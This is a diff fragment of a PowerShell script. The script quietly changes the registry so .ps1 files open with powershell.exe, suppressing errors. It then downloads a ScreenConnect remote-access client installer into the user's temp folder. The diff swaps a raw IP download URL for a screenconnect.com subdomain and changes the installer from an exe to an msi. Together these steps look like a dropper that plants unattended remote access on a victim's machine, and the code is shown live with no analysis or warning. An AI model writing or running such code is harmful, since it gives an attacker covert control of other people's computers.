@@ -14,8 +14,8 @@ try {
 
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.ps1\UserChoice" -Name "Progid" -Value "Applications\powershell.exe" -ErrorAction SilentlyContinue
     
-    $url = "http://207.174.0.98/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
-    $output = "$env:TEMP\ScreenConnect.ClientSetup.exe"
+    $url = "https://earthlink7.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+    $output = "$env:TEMP\ScreenConnect.ClientSetup.msi"
     
 
     $webClient = New-Object System.Net.WebClient
